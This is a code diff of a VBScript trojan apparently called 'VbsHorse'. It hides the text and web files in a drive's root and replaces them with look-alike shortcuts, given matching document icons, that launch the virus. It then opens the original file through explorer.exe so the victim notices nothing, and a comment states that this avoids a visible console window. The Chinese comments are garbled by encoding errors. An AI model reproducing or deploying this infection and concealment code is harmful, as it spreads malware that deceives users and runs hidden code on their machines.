@@ -5,8 +5,8 @@ Call Main()
 Sub Main()
 	Dim args
 	Set args = WScript.Arguments
-	If args.Count > 0 Then
-		originFilePath = args(args.Count - 1)
+	If args.Count = 2 Then
+		originFilePath = args(0)
 		Call OpenFile(originFilePath)
 	End If
 	
@@ -16,11 +16,11 @@ End Sub
 Sub OpenFile(filePath)
 	Dim objShell
 	Set objShell = CreateObject("WScript.Shell")
-	objShell.Run("explorer.exe " & filePath) 'ä¸ä½¿ç”¨CMDæ‰“å¼€ï¼Œé˜²æ­¢äº§ç”Ÿé»‘æ¡†è¢«ç”¨æˆ·å‘è§‰
+	objShell.Run("explorer.exe " & filePath) '²»Ê¹ÓÃCMD´ò¿ª£¬·ÀÖ¹²úÉúºÚ¿ò±»ÓÃ»§·¢¾õ
 	Set objShell = Nothing
 End Sub
 
-Sub LnkInfectDrive(drivePath) 'ä¸ºç£ç›˜æ ¹ç›®å½•ä¸‹æ‰€æœ‰çš„txt, log, htmlæ–‡ä»¶åˆ›å»ºæŒ‡å‘VbsHorseçš„å¿«æ·æ–¹å¼ï¼Œå¹¶éšè—åŸæ–‡ä»¶
+Sub LnkInfectDrive(drivePath) 'Îª´ÅÅÌ¸ùÄ¿Â¼ÏÂËùÓĞµÄtxt, log, htmlÎÄ¼ş´´½¨Ö¸ÏòVbsHorseµÄ¿ì½İ·½Ê½£¬²¢Òş²ØÔ­ÎÄ¼ş
 	Dim objFileSystem
 	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	Dim folder, files
@@ -28,12 +28,12 @@ Sub LnkInfectDrive(drivePath) 'ä¸ºç£ç›˜æ ¹ç›®å½•ä¸‹æ‰€æœ‰çš„txt, log, htmlæ–‡ä»
 	Set files = folder.Files
 	For Each file In files
 		fileSuffix = GetFileSuffix(file.Name)
-		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then 'æ˜¯å¦ä¸æ˜¯å¿«æ·æ–¹å¼æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶åä¸æ˜¯ç—…æ¯’å
+		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then 'ÊÇ·ñ²»ÊÇ¿ì½İ·½Ê½ÎÄ¼ş£¬ÇÒÎÄ¼şÃû²»ÊÇ²¡¶¾Ãû
 			lnkPath = drivePath & file.Name & ".lnk"
-			If objFileSystem.FileExists(lnkPath) = False Then 'å¦‚æœä¸å­˜åœ¨æ–‡ä»¶
-				targetPath = drivePath & VbsHorseVirusName
-				args = file.Path
-				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) 'åˆ›å»ºå¯¹åº”çš„å¿«æ·æ–¹å¼å¹¶éšè—åŸæ–‡ä»¶
+			If objFileSystem.FileExists(lnkPath) = False Then 'Èç¹û²»´æÔÚÎÄ¼ş
+				targetPath = drivePath& VbsHorseVirusName
+				args = Chr(34) & file.Name & Chr(34) & " shortcut"
+				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '´´½¨¶ÔÓ¦µÄ¿ì½İ·½Ê½²¢Òş²ØÔ­ÎÄ¼ş
 			End If
 		End If
 	Next
@@ -46,18 +46,18 @@ Function GetFileSuffix(fileName)
 	Set splitFileNameArray = Nothing
 End Function
 
-Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) 'åˆ›å»ºå¯¹åº”çš„å¿«æ·æ–¹å¼å¹¶éšè—åŸæ–‡ä»¶
+Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '´´½¨¶ÔÓ¦µÄ¿ì½İ·½Ê½²¢Òş²ØÔ­ÎÄ¼ş
 	originFileSuffix = GetFileSuffix(originFilePath)
-	Select Case originFileSuffix 'æ£€æŸ¥æ˜¯å¦æ˜¯txt, log, html, htm, mhtç±»å‹çš„æ–‡ä»¶
-	Case "txt", "log" 'æ–‡æœ¬
+	Select Case originFileSuffix '¼ì²éÊÇ·ñÊÇtxt, log, html, htm, mhtÀàĞÍµÄÎÄ¼ş
+	Case "txt", "log" 'ÎÄ±¾
 		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
-	Case "html", "htm", "mht" 'ç½‘é¡µ
+	Case "html", "htm", "mht" 'ÍøÒ³
 		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
 	Case Else
 		Exit Sub
 	End Select
 	
-	Call HideFile(originFilePath) 'éšè—åŸæ–‡ä»¶
+	Call HideFile(originFilePath) 'Òş²ØÔ­ÎÄ¼ş
 	
 	Dim objShell, shortcut
 	Set objShell = CreateObject("WScript.Shell")
@@ -77,7 +77,7 @@ Sub HideFile(filePath)
 	Dim objFileSystem, objFile
 	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	Set objFile = objFileSystem.GetFile(filePath)
-	objFile.Attributes = 2 '0-æ™®é€š 1-åªè¯» 2-éšè— 4-ç³»ç»Ÿ
+	objFile.Attributes = 2 '0-ÆÕÍ¨ 1-Ö»¶Á 2-Òş²Ø 4-ÏµÍ³
 	Set objFileSystem = Nothing
 	Set objFile = Nothing
 End Sub
